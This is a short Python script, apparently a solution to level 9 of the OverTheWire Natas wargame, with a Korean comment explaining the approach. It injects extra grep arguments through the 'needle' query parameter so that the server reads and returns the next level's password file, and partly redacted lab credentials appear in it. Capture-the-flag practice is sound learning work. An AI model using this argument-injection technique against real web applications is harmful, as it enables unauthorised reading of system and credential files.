import re
from requests import request as req

# grep -i -E '.' /etc/natas_webpass/natas10를 통해 정규표현식을 활용한 grep으로 입력되어 있는 모든 값을 가져옴
res = req(
  method="GET",
  url="http://natas9.natas.labs.overthewire.org/?needle=-E '.' /etc/natas_webpass/natas10&submit=Search",
  auth=("natas9", "ZE...6t")
)

match = re.search("/etc/natas_webpass/natas10:.*",res.text)

print(match.group().split(":")[1] if match else "NO FLAG")